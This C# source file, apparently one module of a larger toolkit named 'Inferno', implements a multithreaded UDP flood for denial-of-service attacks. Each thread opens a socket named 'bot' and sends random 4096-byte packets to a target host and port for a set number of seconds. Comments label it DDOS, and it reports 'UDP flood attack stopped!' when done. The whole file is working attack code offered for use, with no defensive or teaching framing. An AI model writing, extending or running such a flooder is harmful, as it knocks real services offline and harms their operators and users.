using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Inferno
{
    internal class udp
    {

        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        // Threads list
        private static List<Thread> threadsList = new List<Thread>();

        // Send packet
        private static void send(string host, int seconds, int port = 80)
        {
            IPEndPoint IPEo;
            // host:port
            if (host.Contains(":"))
            {
                port = Int32.Parse(host.Split(':')[1]);
                host = host.Split(':')[0];
            }

            try {
                IPEo = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
            } catch {
                IPEo = new IPEndPoint(IPAddress.Parse(host), port);
            }

            Socket bot = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            Random rand = new Random();
            DateTime d = DateTime.Now.AddSeconds(seconds);
            while (DateTime.Compare(DateTime.Now, d) < 0)
            {
                Byte[] r = new Byte[4096];
                rand.NextBytes(r);
                bot.SendTo(r, IPEo);
            }
        }
        // DDOS
        public static void flood(string target, int threads, int seconds)
        {
            // Start threads
            for (int i = 0; i < threads; i++)
            {
                Thread thread = new Thread(() => send(target, seconds));
                thread.Start();
                threadsList.Add(thread);
            }

            // Wait for stop threads
            foreach (Thread thread in threadsList)
            {
                if (thread.IsAlive) { thread.Join(); }
            }

            // Show output
            output.target = target;
            output.threads = threads;
            output.seconds = seconds;
            core.Exit("UDP flood attack stopped!", output);
        }
    }
}
